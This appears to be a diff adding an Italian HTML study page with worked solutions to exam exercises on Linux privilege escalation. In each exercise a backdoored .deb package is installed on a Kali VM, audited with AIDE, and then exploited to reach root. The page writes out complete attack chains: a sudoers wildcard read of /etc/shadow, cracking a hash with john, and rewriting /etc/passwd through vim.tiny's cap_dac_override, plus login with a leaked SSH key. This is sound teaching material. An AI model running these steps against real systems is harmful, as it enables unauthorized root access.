+<p><code>esame_2025.10.30_all.deb.gpg</code>. Fase 1: predisporre l'identificazione, decifrare
+(<code>gpg -d … &gt; e.deb</code>), <code>sudo dpkg -i e.deb</code>, attuare la strategia. Fase 2: <strong>senza il potere sudo
+di <code>kali</code></strong>, diventare root e <code>id</code>. <code>integrity.txt</code> + <code>privesc.png</code>.</p>
+</blockquote>
+<h3 id="fase-1-diff-aide_1">Fase 1 — diff AIDE</h3>
+<p>Config AIDE come sopra (<code>/etc f Full</code>, <code>/usr/bin f Full</code>, <code>@@x_include</code> commentato, <code>aideinit</code>,
+<code>gpg -d</code>, <code>dpkg -i</code>, <code>aide -C</code>). Diff (1 aggiunto + 8 changed, trascrizione ufficiale):</p>
+<pre><code>ADDED:   /etc/sudoers.d/searcher
+CHANGED: /etc/group /etc/gshadow /etc/passwd /etc/shadow
+         /usr/bin/chmod (ACL)  /usr/bin/stdbuf (SUID)  /usr/bin/vim.tiny (cap + gid)  /usr/bin/whoami (cap)
+</code></pre>
+<p>Contenuto del nuovo file sudoers (leggibile):
+<code>searcher    ALL=(root) NOPASSWD: /usr/bin/find /etc/passwd -exec cat *</code></p>
+<p>Nuovi utenti: <code>searcher::11110:11110:Look and ya shall find:/tmp:/bin/bash</code> (<strong>senza password</strong>) e
+<code>wbr:x:11111:11111:wannaberoot:/home/wbr:/bin/bash</code>. <code>getcap</code>: <code>vim.tiny cap_dac_override=eip</code>,
+<code>whoami cap_mknod=eip</code>. <code>vim.tiny</code> eseguibile solo dal gruppo <code>wbr</code>. Vicoli ciechi: <code>stdbuf</code> (SUID
+ma inutile), <code>whoami</code> (cap_mknod inutile), <code>chmod</code> (ACL <code>user:wbr:rw</code> ma <code>chmod</code> senza privilegi
+speciali).</p>
+<h3 id="fase-2-exploit-trascrizione-integritytxt-privesc4png">Fase 2 — exploit (trascrizione integrity.txt + privesc4.png)</h3>
+<pre><code>su searcher                                                        # senza password
+grep wbr /etc/passwd &gt; p
+sudo /usr/bin/find /etc/passwd -exec cat /etc/shadow \; | grep wbr &gt; s   # WILDCARD abuse: cat /etc/shadow come root
+unshadow p s &gt; wbr
+john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt wbr  # → wbr: estrellas
+su - wbr                                                           # Password: estrellas
+vim.tiny /etc/passwd                                               # cap_dac_override → mette UID di searcher a 0
+su searcher                                                        # searcher è ora UID 0 e senza password → root
+# root@kali:/home/wbr#
+</code></pre>
+<h3 id="perche-funziona_6">Perché funziona</h3>
+<p>Quattro anelli. (1) <code>searcher</code> senza password. (2) <strong>Abuso della wildcard in sudoers</strong>: la regola
+consente <code>/usr/bin/find /etc/passwd -exec cat *</code>; il <code>*</code> finale lascia a <code>searcher</code> la libertà di
+mettere <strong>qualsiasi argomento</strong> dopo <code>cat</code>, quindi <code>find … -exec cat /etc/shadow \;</code> esegue
+<code>cat /etc/shadow</code> <strong>come root</strong> ed esfiltra l'hash (questo è il trucco distintivo dell'esercizio:
+una regola sudoers apparentemente innocua diventa lettura arbitraria per la wildcard). (3) <code>john</code>
+cracca <code>wbr</code> (<code>estrellas</code>) offline. (4) <code>vim.tiny</code> ha <code>cap_dac_override</code> ed è eseguibile come
+gruppo <code>wbr</code>: <code>wbr</code> lo usa per editare <code>/etc/passwd</code> e mettere <strong>l'UID di <code>searcher</code> a 0</strong>; poiché
+<code>searcher</code> non ha password, <code>su searcher</code> apre subito una shell root. Depistaggi: <code>stdbuf</code> (SUID),
+<code>whoami</code> (cap_mknod), <code>chmod</code> (ACL). Meccanismo condiviso col caso 12 gennaio 2026 (cap_dac_override
++ vim.tiny), ma qui l'obiettivo dell'edit è <strong>cambiare un UID a 0</strong> anziché svuotare il campo
+password di root.</p>
+<hr />
+<h2 id="secondo-caso-pacchetto-malevolo-con-piu-modifiche-solo-alcune-sfruttabili-12-gennaio-2026">Secondo caso: pacchetto malevolo con più modifiche — solo alcune sfruttabili (12 gennaio 2026)</h2>
+<blockquote>
+<p>Fonte: stesso HTML, esercizio 9 "esercizio 12 gennaio 2026" (prova d'esame passata più recente
+al 09/07/2026, stessa giornata d'esame di <code>trace-2026-01-12.pcapng</code> in NIDS). Soluzione ufficiale
+del prof recuperata dall'allegato "Soluzione" nascosto nella pagina (tarball <code>privesc</code>, con
+<code>integrity.txt</code> + 3 screenshot reali).</p>
+</blockquote>
+<h3 id="consegna-originale_7">Consegna originale</h3>
+<blockquote>
+<p>Scaricare <code>esame_2026.01.12_all.deb.gpg</code> sulla VM Kali (usare una VM mai alterata da esercizi
+precedenti). Il pacchetto modifica file/directory dentro <code>/etc</code> e <code>/usr/bin</code>, più eventualmente
+altre da dedurre. <strong>Parte 1</strong>: decifrare (<code>gpg -d esame_2026.01.12_all.deb.gpg &gt; e.deb</code>, password
+<code>esame</code>), installare (<code>sudo dpkg -i e.deb</code>), identificare cosa è cambiato. <strong>Parte 2</strong>: <strong>senza
+usare il potere sudo dell'utente kali</strong>, diventare root e lanciare <code>id</code>. Documentare tutto in
+<code>integrity.txt</code>, catturare screenshot del successo in <code>privesc.png</code> (o <code>privesc1.png</code>, <code>2</code>, <code>3</code>...).</p>
+</blockquote>
+<p>Diversa dal primo caso in un punto importante: qui il pacchetto introduce <strong>più modifiche
+contemporaneamente</strong>, e non tutte sono sfruttabili — parte dell'esercizio è proprio distinguere
+il vettore reale dai vicoli ciechi.</p>
+<h3 id="fase-1-setup-aide-e-installazione-del-pacchetto">Fase 1 — Setup AIDE e installazione del pacchetto</h3>
+<pre><code>sudo nano /etc/aide/aide.conf     # in fondo al file, aggiungere:
+/usr/bin f Full
+/etc f Full
+
+sudo aideinit --config /etc/aide/aide.conf
+sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db   # database &quot;pulito&quot; PRIMA della modifica
+sudo aide --check --config /etc/aide/aide.conf            # baseline: nessuna differenza attesa
+
+gpg -d esame_2026.01.12_all.deb.gpg &gt; e.deb
+sudo dpkg -i e.deb                                         # il &quot;pacchetto malevolo&quot;
+
+sudo aide --check --config /etc/aide/aide.conf             # confronto: qui emergono le modifiche
+</code></pre>
+<h3 id="fase-2-leggere-il-diff-di-aide-4-modifiche-solo-1-sfruttabile">Fase 2 — Leggere il diff di AIDE: 4 modifiche, solo 1 sfruttabile</h3>
+<p>AIDE segnala un file <strong>aggiunto</strong> e 14 <strong>modificati</strong>. Smontarli uno per uno (esattamente il
+lavoro richiesto dalla Parte 1):</p>
+<ol>
+<li><strong><code>/etc/backup/id_guest</code> (nuovo file)</strong> — <code>file /etc/backup/id_guest</code> rivela <code>OpenSSH private
+   key</code>. Una chiave privata lasciata leggibile è di per sé un vettore: chiunque la legga può
+   autenticarsi come il suo proprietario.</li>
+<li><strong><code>/etc/passwd</code>, <code>/etc/group</code>, <code>/etc/shadow</code> (+ backup <code>-</code>) modificati</strong> — leggendo i file
+   pubblicamente accessibili (<code>passwd</code>, <code>group</code>) si scopre la riga aggiunta:
+   <code>guest:x:1004:1004::/home/guest:/bin/sh</code> — un nuovo utente <code>guest</code>, verosimilmente il
+   proprietario della chiave trovata al punto 1.</li>
+<li><strong>ACL su <code>/usr/bin/mknod</code> modificata</strong> — <code>getfacl</code> mostra <code>user:guest:rwx</code>: <code>guest</code> ha pieno
+   controllo del binario. <strong>Vicolo cieco</strong>: <code>mknod</code> (creare device file) non è un binario con
+   privilegi speciali di suo — controllarlo non dà nulla in più.</li>
+<li><strong>SGID su <code>/etc/timidity/</code> aggiunto</strong> — la directory guadagna il bit SGID per il gruppo
+   <code>root</code>. <strong>Vicolo cieco</strong>: il bit ha effetto solo sui file creati <em>dai membri del gruppo root</em>
+   dentro quella directory — <code>guest</code> non ne fa parte, non se ne fa nulla.</li>
+<li><strong>Capability su <code>/usr/bin/vim.tiny</code> aggiunta</strong> — <code>getcap</code> mostra <code>cap_dac_override=eip</code>, e i
+   permessi sono <code>----rwx--- root:guest</code> (eseguibile solo dal gruppo <code>guest</code>). <strong>Questo è il
+   vettore reale</strong> — vedi sotto perché.</li>
+</ol>
+<p>Il punto pedagogico: un pacchetto malevolo realistico non lascia <em>una</em> backdoor pulita, ne lascia
+diverse, alcune vere e alcune rumore. AIDE le trova tutte indiscriminatamente — il ragionamento
+su quale sia sfruttabile è lavoro umano, non automatizzabile dal tool.</p>
+<h3 id="fase-3-exploit-in-due-passi-senza-mai-usare-sudo">Fase 3 — Exploit in due passi (senza mai usare sudo)</h3>
+<p><strong>Passo A — usare la chiave trovata per diventare <code>guest</code>:</strong></p>
+<pre><code>cp /etc/backup/id_guest .
+chmod 400 id_guest
+ssh -i id_guest guest@localhost
+</code></pre>
+<p>Successo (<code>privesc_1.png</code>): login come <code>guest</code> via SSH, nessun uso di <code>sudo</code>.</p>
+<p><strong>Passo B — sfruttare la capability di <code>vim.tiny</code> per riscrivere <code>/etc/passwd</code>:</strong></p>
+<pre><code>guest@parrot:~$ vim.tiny /etc/passwd
+# rimuovere la &quot;x&quot; dalla riga di root:  root:x:0:0:root:/root:/bin/bash → root::0:0:...
+# vim.tiny avvisa che il file sembra non scrivibile, ma forzare comunque:
+:w!
+guest@parrot:~$ su -
+#id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>Successo (<code>privesc_2.png</code>: il salvataggio forzato con "x" rimossa; <code>privesc_3.png</code>: <code>su -</code> seguito
+da <code>id</code> come root).</p>
+<h3 id="perche-funziona-meccanismo-non-solo-comandi_1">Perché funziona (meccanismo, non solo comandi)</h3>
+<p><strong>La capability <code>cap_dac_override</code></strong> è il cuore dell'exploit, e va capita bene perché è una
+famiglia di privesc a sé (diversa da SUID, diversa da ACL, diversa da sudoers). Normalmente ogni
+processo, anche se lanciato da root, è comunque soggetto ai controlli DAC (Discretionary Access
+Control — i classici permessi <code>rwx</code> su file/directory) quando root non ha già i privilegi via
+UID 0. Le <em>capabilities</em> Linux spacchettano "cosa può fare root" in decine di permessi granulari
+assegnabili a un binario <strong>senza renderlo SUID-root</strong> — <code>cap_dac_override</code> specificamente è il
+permesso "ignora i controlli di permesso in lettura/scrittura sui file, chiunque sia il processo
+che mi esegue". Un editor con questa capability attiva può aprire e scrivere <strong>qualunque file</strong>,
+indipendentemente da chi lo lancia e da cosa dicono i permessi Unix del file — è esattamente
+perché <code>vim.tiny</code>, eseguito da <code>guest</code> (che non avrebbe alcun permesso di scrittura su
+<code>/etc/passwd</code>), riesce comunque a salvare la modifica con <code>:w!</code>.</p>
+<p><strong>Perché rimuovere la "x" da <code>/etc/passwd</code> basta per diventare root senza password</strong>: il formato
+storico di <code>/etc/passwd</code> è <code>utente:password:uid:gid:...</code> — oggi il campo password contiene sempre
+<code>x</code> (segnaposto che dice "la password vera è in <code>/etc/shadow</code>, cifrata"). Se quel campo è <strong>vuoto</strong>
+invece di contenere <code>x</code> o un hash, per la semantica classica del sistema di autenticazine
+significa "nessuna password richiesta" per quell'utente — <code>su -</code> verso <code>root</code> con il campo password
+vuoto non chiede nulla e concede la shell root immediatamente.</p>
+<p><strong>Perché i vicoli ciechi (mknod, timidity) sono deliberatamente nel diff</strong>: insegnano a
+distinguere "AIDE ha trovato una modifica" da "la modifica è sfruttabile" — un binario con ACL
+generosa ma senza privilegi speciali di partenza, o un bit SGID su un gruppo di cui non fai parte,
+non ti avvicinano a root. Solo la combinazione <strong>capability che bypassa i controlli di permesso</strong> +
+<strong>file di sistema che controlla l'autenticazione</strong> è la ricetta di un privesc reale — la stessa
+logica del primo caso (SUID su <code>cp</code> per riscrivere <code>passwd</code>/<code>shadow</code>), ma con un meccanismo di
+bypass diverso (capability invece di SUID).</p></article>
+</main>
+
+<footer class="pieDiPagina">
+  <p>Generato il 2026-09-02 16:48 da <code>scripts/build_ui.py</code>. Sola lettura.</p>
+</footer>
+
+<dialog class="ricerca" id="ricerca">
+  <input type="search" id="ricerca-campo" placeholder="Cerca in tutto il cockpit…" autocomplete="off">
+  <ul id="ricerca-esiti"></ul>
+</dialog>
+
+<script>window.RADICE = "../";</script>
+<script src="../assets/indice.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
